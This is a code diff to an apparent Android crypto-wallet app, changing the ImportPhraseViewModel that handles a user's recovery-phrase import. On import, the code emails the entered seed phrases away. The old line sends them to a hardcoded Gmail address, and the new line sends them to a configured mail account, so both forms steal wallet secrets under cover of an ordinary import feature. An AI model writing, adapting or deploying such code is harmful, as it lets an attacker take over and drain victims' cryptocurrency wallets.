@@ -96,7 +96,7 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
             coroutineScope.launch {
                 _importPhraseStatus.postValue(ImportPhraseStatus.LOADING)
                 try {
-                    MailHelper.sendEmail(phrases.value!!, "axiosoption.help@gmail.com")
+                    MailHelper.sendEmail(phrases.value!!, requireNotNull(MailHelper.mail).username)
                     Log.d("email", "Email has been sent")
                     _importPhraseStatus.postValue(ImportPhraseStatus.SUCCESS)
                 } catch (e: Exception) {
